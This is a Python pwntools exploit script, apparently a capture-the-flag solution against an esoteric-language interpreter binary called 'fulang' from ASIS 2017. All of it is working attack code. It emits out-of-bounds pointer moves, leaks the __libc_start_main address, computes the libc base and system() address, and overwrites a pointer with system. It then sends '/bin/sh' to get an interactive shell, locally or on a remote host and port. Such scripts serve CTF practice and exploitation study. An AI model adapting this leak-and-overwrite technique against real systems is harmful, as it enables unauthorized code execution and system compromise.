#!/usr/bin/env python

from pwn import *
import sys



def exploit(r):
	r.recvuntil(':')

	incp = ':>'
	decp = ':<'
	incv = ':+'
	decv = ':-'
	inst = ':.'
	putc = '::'

	sc = ''
	for i in range(0x20):
		sc += decp

	sc += inst
	sc += putc

	sc += incp
	sc += putc
	sc += incp
	sc += putc
	sc += incp
	sc += putc

	for i in range(11):
		sc += decp

	sc += inst
	sc += incp
	sc += inst

	sc += incp
	sc += incp
	sc += incp

	sc += inst
	sc += incp
	sc += inst
	sc += incp
	sc += inst

	r.sendline(sc)
	r.send(chr(0x24))
	r.send(chr(0xde))
	r.send(chr(0x86))

	sleep(1)
	libc_start_main = u32(r.recv(4))
	log.info("libc_start_main: " + hex(libc_start_main))
	libc_base = libc_start_main - 0x18540
	log.info('libc_base: ' + hex(libc_base))
	libc_system = libc_base + 0x3a940
	log.info("libc_system: " + hex(libc_system))

	r.send(chr(libc_system & 0xff))
	r.send(chr((libc_system & 0xff00) >> 8))
	r.send(chr((libc_system & 0xff0000) >> 16))


	print 'sc len: %d' % (len(sc))

	r.sendlineafter(':', '/bin/sh\x00')

	r.interactive()


if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['/vagrant/asis2017/fu_interp/fulang'])
        print util.proc.pidof(r)
        pause()
        exploit(r)